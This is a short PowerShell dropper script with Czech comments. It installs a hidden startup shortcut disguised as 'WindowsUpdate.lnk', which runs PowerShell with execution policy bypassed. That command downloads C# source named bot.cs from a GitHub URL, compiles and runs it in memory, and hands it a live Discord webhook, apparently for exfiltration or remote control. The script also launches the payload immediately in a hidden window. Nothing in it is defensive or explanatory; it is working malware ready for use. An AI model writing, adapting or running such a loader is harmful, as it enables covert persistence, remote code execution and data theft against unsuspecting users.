$webhook = "https://discord.com/api/webhooks/1491728198092849215/DkCsPFapma_HMcUuG5GBIt6B9f55h99touvLjLOxvyLijuaTuZT15NO-xzYrJ78S2d2o"
$github = "https://raw.githubusercontent.com/jfheifohfai/diwidwidid/refs/heads/main/bot.cs"
$lnkPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WindowsUpdate.lnk"

# Smazání zbytků starých verzí pro jistotu
$oldVbs = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\SecurityCheck.vbs"
if (Test-Path $oldVbs) { Remove-Item $oldVbs -Force }

# Příkaz pro PowerShell (LNK verze)
$arg = "-WindowStyle Hidden -ExecutionPolicy Bypass -Command `"`$w='$webhook'; `$g='$github'; `$c=(iwr -UseBasicParsing `$g).Content; Add-Type -TypeDefinition `$c -ReferencedAssemblies 'System.Management','System.Net.Http','System.Drawing','System.Windows.Forms','System.IO'; [Program]::Main(`$w)`""

# Vytvoření čistého zástupce
$shell = New-Object -ComObject WScript.Shell
$shortcut = $shell.CreateShortcut($lnkPath)
$shortcut.TargetPath = "powershell.exe"
$shortcut.Arguments = $arg
$shortcut.WindowStyle = 7
$shortcut.Save()

# Spuštění procesu
Start-Process powershell.exe -ArgumentList $arg -WindowStyle Hidden
